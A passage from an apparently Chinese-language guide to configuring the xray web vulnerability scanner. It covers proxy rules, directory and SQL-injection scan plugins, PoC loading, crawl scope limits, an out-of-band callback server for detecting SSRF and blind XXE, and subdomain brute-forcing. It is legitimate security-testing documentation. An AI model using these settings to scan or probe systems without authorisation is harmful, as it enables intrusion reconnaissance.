class="hljs-number">1111</span><br>https:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">1111</span><br>socks5:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">1080</span><br></code></pre></td></tr></table></figure><p>如果代理需要认证，可以使用下面的格式 <code>http://user:password@127.0.0.1:1111</code></p><h3 id="多代理配置"><a href="#多代理配置" class="headerlink" title="多代理配置"></a>多代理配置</h3><p>不同的域名使用不同的代理，设置多个代理切换等，可以通过 <code>proxy_rule</code> 字段来配置。==Proxy 配置将优先于本配置。==</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs vim">proxy_rule:<br>  - <span class="hljs-keyword">match</span>: <span class="hljs-string">&quot;*host1&quot;</span><br>    server<span class="hljs-variable">s:</span><br>      - addr: <span class="hljs-string">&quot;http://127.0.0.1:8001&quot;</span><br>        weigh<span class="hljs-variable">t:</span> <span class="hljs-number">1</span><br>      - addr: <span class="hljs-string">&quot;http://127.0.0.1:8002&quot;</span><br>        weigh<span class="hljs-variable">t:</span> <span class="hljs-number">2</span><br>  - <span class="hljs-keyword">match</span>: <span class="hljs-string">&quot;*&quot;</span><br>    server<span class="hljs-variable">s:</span><br>      - addr: <span class="hljs-string">&quot;http://127.0.0.1:8003&quot;</span><br>        weigh<span class="hljs-variable">t:</span> <span class="hljs-number">1</span><br>      - addr: <span class="hljs-string">&quot;http://127.0.0.1:8004&quot;</span><br>        weigh<span class="hljs-variable">t:</span> <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><ul><li>match: 请求的 url 的主机名如果匹配，就使用本条规则。<ul><li>如果是 <code>*</code>，则代表可以匹配所有。所以一定要将 <code>*</code> 放在最后面，上面没有匹配到的域名都将使用这个配置。</li><li>如果没有任何一条可以匹配，这个请求将不会使用代理。</li></ul></li><li>addr: 代理服务器的地址，同 <code>proxy</code> 的配置。</li><li>weight: 代理服务器的权重，如果 <code>servers</code> 中配置了多个代理服务器，设置权重可以均衡负载，比如权重是 <code>3:7</code>，则代表每 10 个请求，有 3 个选择 server1，有 7 个选择 server2。要注意的是，这里是 round bin 算法，前 3 个一定发往 server1，后面 7 个一定发往 server2，然后继续循环，不是每个请求都是基于权重随机的。</li></ul><h3 id="插件配置"><a href="#插件配置" class="headerlink" title="插件配置"></a>插件配置</h3><h4 id="dirscan"><a href="#dirscan" class="headerlink" title="dirscan"></a>dirscan</h4><ul><li><code>depth</code> 深度限制</li><li><code>dictionary</code> 配置目录字典, 需要是绝对路径, 配置后将与内置字典<strong>合并</strong></li></ul><p><code>depth</code> 是探测深度, 默认为 1, 即只在 URL 深度为 0, 和深度为 1 时运行该插件（前提是启用了该插件)</p><p>定义 <code>http://example.com/</code>，深度为 0，定义 <code>http://example.com/a/</code>, 深度为 1。 在这种配置下，dirscan 将对</p><p><code>http://example.com/</code> 和 <code>http://example.com/a/</code> 做两次扫描，如果存在 <code>http://example.com/a/example.zip</code> 那么就能将其扫描出来。</p><h4 id="sqldet"><a href="#sqldet" class="headerlink" title="sqldet"></a>sqldet</h4><p>下面这个选项很<strong>危险</strong>，开启之后可以增加检测率，但是有破坏数据库数据的可能性，请务必了解工作原理之后再开启</p><ul><li><code>dangerously_use_comment_in_sql</code> 允许检查注入的时候使用注释</li></ul><h4 id="phantasm"><a href="#phantasm" class="headerlink" title="phantasm"></a>phantasm</h4><p>xray 的 poc 框架，在其下运行着许多 yaml 和 go 写的 poc，用户可以通过该模块编写自己的 poc 并让 xray 加载，具体见 自定义POC语法</p><p>两个重点配置:</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">depth:</span> <span class="hljs-number">1</span>                            <span class="hljs-meta"># 与 dirscan 一样，不再赘述</span><br><span class="hljs-symbol">exclude_poc:</span> []                     <span class="hljs-meta"># 排除哪些 poc, 支持 glob 语法, 如: /home/poc/*thinkphp* 或 poc-yaml-weblogic*</span><br><span class="hljs-symbol">local_poc:</span> []                       <span class="hljs-meta"># 加载本地的 poc, 支持 glob 语法, 如： /home/poc/*</span><br></code></pre></td></tr></table></figure><p><code>exclude_poc</code> 用于去除加载哪些 poc。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">plugins:</span><br>  <span class="hljs-string">...</span><br>  <span class="hljs-attr">phantasm:</span><br>    <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">exclude_poc:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">poc-yaml-bad-poc</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">*bad-poc*</span><br></code></pre></td></tr></table></figure><p><code>local_poc</code> 是用于加载本地的 poc 的配置，最好指定绝对路径，且同样支持 glob 语法。</p><p>一个稍微复杂的情况是将这两个搭配起来使用，比如:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">plugins:</span><br>  ...<br><span class="hljs-symbol">  phantasm:</span><br><span class="hljs-symbol">    enabled:</span> true<br><span class="hljs-symbol">    exclude_poc:</span><br>    - <span class="hljs-meta-keyword">/home/</span>poc/poc-fake-good-poc<br><span class="hljs-symbol">    local_poc:</span><br>    - <span class="hljs-meta-keyword">/home/</span>poc<span class="hljs-comment">/*good-poc*</span><br></code></pre></td></tr></table></figure><p>上述配置的意思是加载 <code>/home/poc/</code> 目录下所有符合 <code>*good-poc*</code> 这个pattern 的poc，同时去掉同样目录下的 <code>poc-fake-good-poc</code></p><h3 id="被动代理配置"><a href="#被动代理配置" class="headerlink" title="被动代理配置"></a>被动代理配置</h3><p>这部分是代理模式的配置</p><h4 id="代理启用密码保护"><a href="#代理启用密码保护" class="headerlink" title="代理启用密码保护"></a>代理启用密码保护</h4><p>对应于 <code>auth</code> 中的配置。</p><p>支持给代理配置基础认证的密码，当设置好 <code>auth</code> 中的 <code>username</code> 和 <code>password</code> 后，使用代理时浏览器会弹框要求输出用户名密码，输入成功后代理才可正常使用。</p><h4 id="限制允许使用该代理的ip"><a href="#限制允许使用该代理的ip" class="headerlink" title="限制允许使用该代理的ip"></a>限制允许使用该代理的ip</h4><p><code>allow_ip_range</code> ，限制哪些ip可以使用该代理。支持单个 IP 和 CIDR 格式的地址，如：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">allow_ip_range:</span> [<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;192.168.1.1/24&quot;</span>]<br></code></pre></td></tr></table></figure><p>留空则允许所有地址访问</p><h4 id="限制扫描范围"><a href="#限制扫描范围" class="headerlink" title="限制扫描范围"></a>限制扫描范围</h4><p><code>restriction</code>中，allowed即为允许访问的，disallowed即为不允许的。如</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">hostname_allowed: []                # 允许访问的 Hostname，支持格式如 t.com、*.t.com、<span class="hljs-number">1.1.1.1</span>、<span class="hljs-number">1.1.1.1</span>/<span class="hljs-number">24、1.1-4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>-<span class="hljs-number">8</span><br>hostname_disallowed:                # 不允许访问的 Hostname，支持格式如 t.com、*.t.com、<span class="hljs-number">1.1.1.1</span>、<span class="hljs-number">1.1.1.1</span>/<span class="hljs-number">24、1.1-4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>-<span class="hljs-number">8</span><br>- &#x27;*google*&#x27;<br></code></pre></td></tr></table></figure><h4 id="代理请求头配置-proxy-header"><a href="#代理请求头配置-proxy-header" class="headerlink" title="代理请求头配置 proxy_header"></a>代理请求头配置 <code>proxy_header</code></h4><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">proxy_header:</span><br><span class="hljs-symbol">    via:</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-meta"># 如果不为空，proxy 将添加类似 Via: 1.1 $some-value-$random 的 http 头</span><br><span class="hljs-symbol">    x_forwarded:</span> false <span class="hljs-meta"># 是否添加 X-Forwarded-&#123;For,Host,Proto,Url&#125; 四个 http 头</span><br></code></pre></td></tr></table></figure><p>如果开启 proxy_header，代理会添加 <code>via</code> 头和 <code>X-Forwarded-*</code> 系列头。</p><p>比如 <code>curl http://127.0.0.1:1234 -H &quot;Via: test&quot; -H &quot;X-Forwarded-For: 1.2.3.4&quot; -v</code>，后端实际收到的请求将会是</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:1234<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>curl/7.54.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Via</span><span class="hljs-punctuation">: </span>test, 1.1 xray-1fe7f9e5241b2b150f32<br><span class="hljs-attribute">X-Forwarded-For</span><span class="hljs-punctuation">: </span>1.2.3.4, 127.0.0.1<br><span class="hljs-attribute">X-Forwarded-Host</span><span class="hljs-punctuation">: </span>127.0.0.1:1234<br><span class="hljs-attribute">X-Forwarded-Proto</span><span class="hljs-punctuation">: </span>http<br><span class="hljs-attribute">X-Forwarded-Url</span><span class="hljs-punctuation">: </span>http://127.0.0.1:1234/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip<br></code></pre></td></tr></table></figure><h4 id="http的代理-upstream-proxy"><a href="#http的代理-upstream-proxy" class="headerlink" title="http的代理 upstream_proxy"></a>http的代理 <code>upstream_proxy</code></h4><p>该项配置仅对 http 代理本身生效，不对漏洞扫描发出的请求生效。漏扫的代理配置HTTP部分</p><h3 id="基础爬虫配置"><a href="#基础爬虫配置" class="headerlink" title="基础爬虫配置"></a>基础爬虫配置</h3><p>看配置就行</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">basic-crawler:</span><br>  <span class="hljs-attr">max_depth:</span> <span class="hljs-number">0</span>                          <span class="hljs-comment"># 最大爬取深度， 0 为无限制</span><br>  <span class="hljs-attr">max_count_of_links:</span> <span class="hljs-number">0</span>                 <span class="hljs-comment"># 本次爬取收集的最大链接数, 0 为无限制</span><br>  <span class="hljs-attr">allow_visit_parent_path:</span> <span class="hljs-literal">false</span>        <span class="hljs-comment"># 是否允许爬取父目录, 如果扫描目标为 t.com/a/且该项为 false, 那么就不会爬取 t.com/ 这级的内容</span><br>  <span class="hljs-attr">restriction:</span>                          <span class="hljs-comment"># 爬虫的允许爬取的资源限制, 为空表示不限制。爬虫会自动添加扫描目标到 Hostname_allowed。</span><br>    <span class="hljs-attr">hostname_allowed:</span> []                <span class="hljs-comment"># 允许访问的 Hostname，支持格式如 t.com、*.t.com、1.1.1.1、1.1.1.1/24、1.1-4.1.1-8</span><br>    <span class="hljs-attr">hostname_disallowed:</span>                <span class="hljs-comment"># 不允许访问的 Hostname，支持格式如 t.com、*.t.com、1.1.1.1、1.1.1.1/24、1.1-4.1.1-8</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;*google*&#x27;</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;*github*&#x27;</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;*.gov.cn&#x27;</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;*.edu.cn&#x27;</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;*chaitin*&#x27;</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;*.xray.cool&#x27;</span><br>    <span class="hljs-attr">port_allowed:</span> []                    <span class="hljs-comment"># 允许访问的端口, 支持的格式如: 80、80-85</span><br>    <span class="hljs-attr">port_disallowed:</span> []                 <span class="hljs-comment"># 不允许访问的端口, 支持的格式如: 80、80-85</span><br>    <span class="hljs-attr">path_allowed:</span> []                    <span class="hljs-comment"># 允许访问的路径，支持的格式如: test、*test*</span><br>    <span class="hljs-attr">path_disallowed:</span> []                 <span class="hljs-comment"># 不允许访问的路径, 支持的格式如: test、*test*</span><br>    <span class="hljs-attr">query_key_allowed:</span> []               <span class="hljs-comment"># 允许访问的 Query Key，支持的格式如: test、*test*</span><br>    <span class="hljs-attr">query_key_disallowed:</span> []            <span class="hljs-comment"># 不允许访问的 Query Key, 支持的格式如: test、*test*</span><br>    <span class="hljs-attr">fragment_allowed:</span> []                <span class="hljs-comment"># 允许访问的 Fragment, 支持的格式如: test、*test*</span><br>    <span class="hljs-attr">fragment_disallowed:</span> []             <span class="hljs-comment"># 不允许访问的 Fragment, 支持的格式如: test、*test*</span><br>    <span class="hljs-attr">post_key_allowed:</span> []                <span class="hljs-comment"># 允许访问的 Post Body 中的参数, 支持的格式如: test、*test*</span><br>    <span class="hljs-attr">post_key_disallowed:</span> []             <span class="hljs-comment"># 不允许访问的 Post Body 中的参数, 支持的格式如: test、*test*</span><br>  <span class="hljs-attr">basic_auth:</span>                           <span class="hljs-comment"># 基础认证信息</span><br>    <span class="hljs-attr">username:</span> <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-attr">password:</span> <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><h3 id="反连平台"><a href="#反连平台" class="headerlink" title="反连平台"></a>反连平台</h3><p>反连平台默认不启用，因为这里面有些配置没有办法自动化，必须由人工配置完成才可使用。需要反连平台才可以检测出来的漏洞包括但不限于：</p><ul><li>ssrf</li><li>fastjson</li><li>s2-052</li><li>xxe 盲打</li><li>所有依赖反连平台的 poc</li></ul><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">reverse:</span><br><span class="hljs-symbol">  db_file_path:</span> <span class="hljs-string">&quot;&quot;</span>                      <span class="hljs-meta"># 反连平台数据库文件位置, 这是一个 KV 数据库</span><br><span class="hljs-symbol">  token:</span> <span class="hljs-string">&quot;&quot;</span>                             <span class="hljs-meta"># 反连平台认证的 Token, 独立部署时不能为空</span><br><span class="hljs-symbol">  http:</span><br><span class="hljs-symbol">    enabled:</span> false<br><span class="hljs-symbol">    listen_ip:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> <br><span class="hljs-symbol">    listen_port:</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-symbol">    ip_header:</span> <span class="hljs-string">&quot;&quot;</span>                       <span class="hljs-meta"># 在哪个 http header 中取 ip，为空代表从 REMOTE_ADDR 中取</span><br><span class="hljs-symbol">  dns:</span><br><span class="hljs-symbol">    enabled:</span> false<br><span class="hljs-symbol">    listen_ip:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> <br><span class="hljs-symbol">    domain:</span> <span class="hljs-string">&quot;&quot;</span>                          <span class="hljs-meta"># DNS 域名配置</span><br><span class="hljs-symbol">    is_domain_name_server:</span> false        <span class="hljs-meta"># 是否修改了域名的 ns 为反连平台，如果是，那 nslookup 等就不需要指定 dns 了</span><br><span class="hljs-symbol">    resolve:</span>                            <span class="hljs-meta"># DNS 静态解析规则</span><br>    - type: A                           <span class="hljs-meta"># A, AAAA, TXT 三种</span><br><span class="hljs-symbol">      record:</span> localhost<br><span class="hljs-symbol">      value:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br><span class="hljs-symbol">      ttl:</span> <span class="hljs-number">60</span><br><span class="hljs-symbol">  client:</span><br><span class="hljs-symbol">    remote_server:</span> false                <span class="hljs-meta"># 是否是独立的远程 server，如果是要在下面配置好远程的服务端地址</span><br><span class="hljs-symbol">    http_base_url:</span> <span class="hljs-string">&quot;&quot;</span>                   <span class="hljs-meta"># 默认将根据 ListenIP 和 ListenPort 生成，该地址是存在漏洞的目标反连回来的地址, 当反连平台前面有反代、绑定域名、端口映射时需要自行配置</span><br><span class="hljs-symbol">    dns_server_ip:</span> <span class="hljs-string">&quot;&quot;</span>                   <span class="hljs-meta"># 和 http_base_url 类似，实际用来访问 dns 服务器的地址</span><br><br></code></pre></td></tr></table></figure><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><h5 id="xray和目标可以用ip双向互联"><a href="#xray和目标可以用ip双向互联" class="headerlink" title="xray和目标可以用ip双向互联"></a>xray和目标可以用ip双向互联</h5><p>假设 192.168.1.2 是 xray 所在机器的地址</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">reverse:</span><br>  <span class="hljs-attr">http:</span><br>    <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">listen_ip:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span><br></code></pre></td></tr></table></figure><p>这里的 192.168.1.2 是 xray 所在的机器的地址, 也是扫描目标反连时所使用的地址。也就是，目标存在漏洞的时候，会访问 <a href="http://192.168.1.2/xxxx">http://192.168.1.2/xxxx</a> 携带漏洞结果和数据</p><h5 id="xray-和目标可以使用-ip-双向互联，但-listen-的地址和目标反连访问的地址不一样"><a href="#xray-和目标可以使用-ip-双向互联，但-listen-的地址和目标反连访问的地址不一样" class="headerlink" title="xray 和目标可以使用 ip 双向互联，但 listen 的地址和目标反连访问的地址不一样"></a>xray 和目标可以使用 ip 双向互联，但 listen 的地址和目标反连访问的地址不一样</h5><p>这种情况经常出现在云主机中，比如腾讯云的 linux 机器网卡地址时 10.xxx，但实际公网假设是 221.xxx</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">reverse:</span><br><span class="hljs-symbol">  http:</span><br><span class="hljs-symbol">    enabled:</span> true<br><span class="hljs-symbol">    listen_ip:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br><span class="hljs-symbol">  client:</span><br><span class="hljs-symbol">    http_base_url:</span> <span class="hljs-string">&quot;http://221.xxx:$&#123;port&#125;&quot;</span> <br></code></pre></td></tr></table></figure><p><code>$&#123;port&#125;</code> 是一个预定义的宏，在运行时将被替换为实际监听的端口, 当然你也可以使用这种方式固定监听的端口：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">reverse:</span><br>  <span class="hljs-attr">http:</span><br>    <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">listen_ip:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br>    <span class="hljs-attr">listen_port:</span> <span class="hljs-number">8888</span><br>  <span class="hljs-attr">client:</span><br>    <span class="hljs-attr">http_base_url:</span> <span class="hljs-string">&quot;http://221.xxx:8888&quot;</span> <br></code></pre></td></tr></table></figure><h5 id="单独布置反连平台"><a href="#单独布置反连平台" class="headerlink" title="单独布置反连平台"></a>单独布置反连平台</h5><p>xray 自带了一个 <code>reverse</code> 命令，可以启动反连平台作为一个远程服务运行，给多个客户端使用。</p><p>在启动之前，需要配置好配置文件的 <code>db_file_path</code> 和 <code>token</code>，前者用于存储数据，后者用于服务端和客户端通信的秘钥。</p><p>一个示例的服务端配置是：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">reverse:</span><br><span class="hljs-symbol">  db_file_path:</span> <span class="hljs-string">&quot;reverse.db&quot;</span><br><span class="hljs-symbol">  token:</span> <span class="hljs-string">&quot;please_change_me_to_a_new_token&quot;</span><br><span class="hljs-symbol">  http:</span><br><span class="hljs-symbol">    listen_ip:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br><span class="hljs-symbol">    listen_port:</span> <span class="hljs-string">&quot;80&quot;</span><br></code></pre></td></tr></table></figure><p>与之对应的客户端配置是：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">reverse:</span><br><span class="hljs-symbol">  token:</span> <span class="hljs-string">&quot;please_change_me_to_a_new_token&quot;</span><br><span class="hljs-symbol">  client:</span><br><span class="hljs-symbol">    remote_server:</span> true<br><span class="hljs-symbol">    http_base_url:</span> <span class="hljs-string">&quot;http://YOUR_REVERSE_SERVER_IP:80&quot;</span><br></code></pre></td></tr></table></figure><p><strong>需要客户端和服务端版本相同</strong></p><h4 id="管理界面"><a href="#管理界面" class="headerlink" title="管理界面"></a>管理界面</h4><p>反连平台贴心的内置了一个管理界面，可以访问反连平台 http 地址，url 为 <code>/cland/</code>。</p><p>功能包括</p><ul><li>生成自定义 url，并记录访问记录</li><li>生成自定义域名，并记录解析记录</li><li>使用平台预制 payload，记录抓取的数据</li></ul><blockquote><p>mac 下的 docker 由于网络环境特殊，其实无法双向互联，建议使用远程部署的模式或使用 <code>host.docker.internal</code> 作为 http_base_url 的 host</p></blockquote><h3 id="子域名配置"><a href="#子域名配置" class="headerlink" title="子域名配置"></a>子域名配置</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">subdomain:</span><br>  <span class="hljs-attr">max_parallel:</span> <span class="hljs-number">30</span>                      <span class="hljs-comment"># 子域名探测的并发度</span><br>  <span class="hljs-attr">allow_recursion:</span> <span class="hljs-literal">false</span>                <span class="hljs-comment"># 是否允许递归探测, 开启后，扫描完一级域名后，会自动将一级的每个域名作为新的目标</span><br>  <span class="hljs-attr">max_recursion_depth:</span> <span class="hljs-number">3</span>                <span class="hljs-comment"># 最大允许的递归深度, 3 表示 3 级子域名 仅当 allow_recursion 开启时才有意义</span><br>  <span class="hljs-attr">web_only:</span> <span class="hljs-literal">false</span>                       <span class="hljs-comment"># 结果中仅显示有 web 应用的, 没有 web 应用的将被丢弃</span><br>  <span class="hljs-attr">ip_only:</span> <span class="hljs-literal">false</span>                        <span class="hljs-comment"># 结果中仅展示解析出 IP 的，没有解析成功的将被丢弃</span><br>  <span class="hljs-attr">servers:</span>                              <span class="hljs-comment"># 子域名扫描过程中使用的 DNS Server</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-number">8.8</span><span class="hljs-number">.4</span><span class="hljs-number">.4</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-number">223.5</span><span class="hljs-number">.5</span><span class="hljs-number">.5</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-number">223.6</span><span class="hljs-number">.6</span><span class="hljs-number">.6</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-number">114.114</span><span class="hljs-number">.114</span><span class="hljs-number">.114</span><br>  <span class="hljs-attr">sources:</span><br>    <span class="hljs-attr">brute:</span><br>      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>      <span class="hljs-attr">main_dict:</span> <span class="hljs-string">&quot;&quot;</span>                     <span class="hljs-comment"># 一级大字典路径，为空将使用内置的 TOP 30000 字典</span><br>      <span class="hljs-attr">sub_dict:</span> <span class="hljs-string">&quot;&quot;</span>                      <span class="hljs-comment"># 其他级小字典路径，为空将使用内置过的 TOP 100 字典</span><br>    <span class="hljs-attr">httpfinder:</span><br>      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>                     <span class="hljs-comment"># 使用 http 的一些方式来抓取子域名，包括 js, 配置文件，http header 等等</span><br>    <span class="hljs-attr">dnsfinder:</span><br>      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>                     <span class="hljs-comment"># 使用 dns 的一些错误配置来找寻子域名，如区域传送（zone transfer)</span><br>    <span class="hljs-attr">certspotter:</span>                        <span class="hljs-comment"># 下面的通过 api 获取的了</span><br>      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">crt:</span><br>      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">hackertarget:</span><br>      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">qianxun:</span><br>      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">rapiddns:</span><br>      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">sublist3r:</span><br>      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">threatminer:</span><br>      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">virusTotal:</span><br>      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br><br></code></pre></td></tr></table></figure><h3 id="检查更新配置"><a href="#检查更新配置" class="headerlink" title="检查更新配置"></a>检查更新配置</h3><p>添加如下即可禁用更新检查</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">update:</span><br>  <span class="hljs-attr">check:</span> <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><h3 id="并发配置"><a href="#并发配置" class="headerlink" title="并发配置"></a>并发配置</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">parallel</span>: <span class="hljs-number">30</span> # 漏洞探测的 worker 数量，可以简单理解为同时有 <span class="hljs-number">30</span> 个 POC 在运行<br></code></pre></td></tr></table></figure><p>默认基本足够</p><h2 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h2><h3 